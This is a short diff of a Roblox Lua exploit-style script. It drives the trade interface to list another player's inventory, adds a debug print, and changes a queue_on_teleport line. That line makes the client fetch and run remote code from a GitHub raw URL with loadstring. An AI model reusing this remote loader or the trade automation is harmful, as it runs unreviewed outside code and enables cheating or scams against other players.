@@ -215,7 +215,9 @@ function GetPlayerInventory(Player)
 			firesignal(LocalPlayer.PlayerGui.AppUI.Trade.ItemTypesContainer.ScrollingGrid[i].Activated)
 
 			for i2, v2 in next, LocalPlayer.PlayerGui.AppUI.Trade.ItemsContainer.ScrollingGrid:GetChildren() do
-				local Category = LocalPlayer.PlayerGui.AppUI.Trade.ItemTypesContainer.ScrollingGrid[i].Title.Text.Text
+				local Category = LocalPlayer.PlayerGui.AppUI.Trade.ItemTypesContainer.ScrollingGrid[i - 1].Title.Text.Text and LocalPlayer.PlayerGui.AppUI.Trade.ItemTypesContainer.ScrollingGrid[i - 1].Title.Text.Text or "Nil"
+				
+				print(Category, v2.Title.Text.Text, i)
 				
 				table.insert(Inventory, {v2.Title.Text.Text, Category})
 			end
@@ -380,7 +382,7 @@ ReplicatedStorageService.OtherTradeServerData.OnClientEvent:Connect(function(Ser
 
 	Cooldown = false
 
-	queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/testdfsdfd/bwds/refs/heads/main/test8'))()")
+	queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/testdfsdfd/bwds/refs/heads/main/test9'))()")
 
 	repeat
 		task.wait(1)
